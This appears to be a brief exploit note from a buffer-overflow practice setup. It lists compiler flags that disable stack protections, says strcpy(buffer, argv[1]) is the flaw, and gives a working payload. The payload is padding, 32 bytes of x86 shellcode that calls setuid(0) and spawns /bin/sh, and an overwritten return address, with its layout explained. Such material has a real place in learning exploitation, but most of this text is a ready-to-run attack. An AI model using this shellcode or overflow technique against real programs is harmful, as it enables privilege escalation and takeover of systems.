# strcpy Exploit Result

```
[+] Compile options

gcc -m32 -o {_EXECUTE_FILE_NAME} {_COMPILE_SOURCE}
-fno-stack-protector
-mpreferred-stack-boundary=2
-no-pie
-z execstack


[+] Notice

1. Consider about buffer size 
2. Consider about strcpy
- strcpy(buffer, argv[1])
- Q. buffer  > argv[1] ? -> exploit success 

[+] Payload
./example $(python2 -c "print 'a'*76 + '\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80' + '\xc0\xd0\xff\xff'")

--- Payload Structure
   1. DUMMY (BUFFER_SIZE - SHELL_CODE_SIZE) : 'a'*76
   2. SHELL_CODE :  32
   3. BUFFER_VARIABLE_ADDRESS

```